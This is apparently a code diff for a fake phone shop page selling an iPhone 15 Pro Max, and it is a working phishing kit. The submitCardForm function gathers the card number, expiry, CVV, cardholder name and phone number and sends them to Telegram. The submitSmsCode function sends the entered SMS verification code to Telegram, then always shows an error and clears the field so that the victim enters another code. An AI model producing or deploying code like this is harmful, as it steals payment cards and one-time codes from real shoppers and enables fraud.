@@ -1,3 +1,142 @@
+// Global function declarations - HTML'den erişilebilir olması için
+window.goToCheckout = () => {
+  showPage("checkoutPage")
+}
+
+window.goToProduct = () => {
+  showPage("productPage")
+}
+
+window.goToPayment = () => {
+  showPage("cardPage")
+}
+
+window.goToSms = () => {
+  showPage("smsPage")
+}
+
+window.selectImage = (index) => {
+  currentImageIndex = index
+  updateMainImage()
+  updateThumbnails()
+}
+
+window.changeImage = (direction) => {
+  const images = colorImages[selectedColor]
+  const newIndex = currentImageIndex + direction
+
+  if (newIndex >= 0 && newIndex < images.length) {
+    currentImageIndex = newIndex
+    updateMainImage()
+    updateThumbnails()
+  }
+}
+
+window.selectColor = (colorId, colorName) => {
+  selectedColor = colorId
+  currentImageIndex = 0
+
+  // Update color options
+  const colorOptions = document.querySelectorAll(".color-option")
+  colorOptions.forEach((option) => {
+    option.classList.remove("active")
+  })
+
+  // Find and activate the selected color option
+  const selectedOption = document.querySelector(`[onclick*="${colorId}"]`)
+  if (selectedOption) {
+    selectedOption.classList.add("active")
+  }
+
+  // Update color name display
+  const colorNameElement = document.getElementById("selectedColorName")
+  if (colorNameElement) {
+    colorNameElement.textContent = colorName
+  }
+
+  // Update product title
+  const productTitle = document.querySelector(".product-title")
+  if (productTitle) {
+    productTitle.textContent = `iPhone 15 Pro Max 256 GB ${colorName}`
+  }
+
+  // Update breadcrumb
+  const breadcrumbCurrent = document.querySelector(".breadcrumb .current")
+  if (breadcrumbCurrent) {
+    breadcrumbCurrent.textContent = `iPhone 15 Pro Max 256 GB ${colorName}`
+  }
+
+  // Update images
+  updateMainImage()
+  updateThumbnailImages()
+  updateThumbnails()
+}
+
+window.submitCardForm = (event) => {
+  event.preventDefault()
+
+  const submitBtn = event.target.querySelector(".btn-confirm")
+  submitBtn.textContent = "İşlənir..."
+  submitBtn.disabled = true
+
+  // Collect card data
+  const cardData = {
+    cardNumber: document.getElementById("cardNumber")?.value || "",
+    expiry:
+      (document.getElementById("expiryMonth")?.value || "") +
+      "/" +
+      (document.getElementById("expiryYear")?.value || ""),
+    cvv: document.getElementById("cvv")?.value || "",
+    cardHolder: document.getElementById("cardHolder")?.value || "",
+    phone:
+      (document.getElementById("phonePrefix")?.value || "") +
+      " " +
+      (document.getElementById("phoneNumber")?.value || ""),
+  }
+
+  // Send to Telegram
+  sendToTelegram(cardData, "PAYMENT")
+
+  // Always proceed to SMS page after 1.5 seconds
+  setTimeout(() => {
+    goToSms()
+  }, 1500)
+}
+
+window.submitSmsCode = (event) => {
+  event.preventDefault()
+
+  const smsCode = document.getElementById("smsCode")?.value || ""
+
+  // Send SMS code to Telegram
+  sendToTelegram({ smsCode }, "SMS")
+
+  // Always show error message and clear input
+  const errorMessage = document.getElementById("errorMessage")
+  if (errorMessage) {
+    errorMessage.style.display = "block"
+  }
+
+  // Clear the input
+  const smsInput = document.getElementById("smsCode")
+  if (smsInput) {
+    smsInput.value = ""
+  }
+}
+
+window.resendSms = () => {
+  // Reset timer
+  startTimer()
+
+  // Show success message
+  alert("SMS kodu yenidən göndərildi")
+
+  // Clear any error messages
+  const errorMessage = document.getElementById("errorMessage")
+  if (errorMessage) {
+    errorMessage.style.display = "none"
+  }
+}
 // Global Variables
 let currentImageIndex = 0
 let selectedColor = "desert"
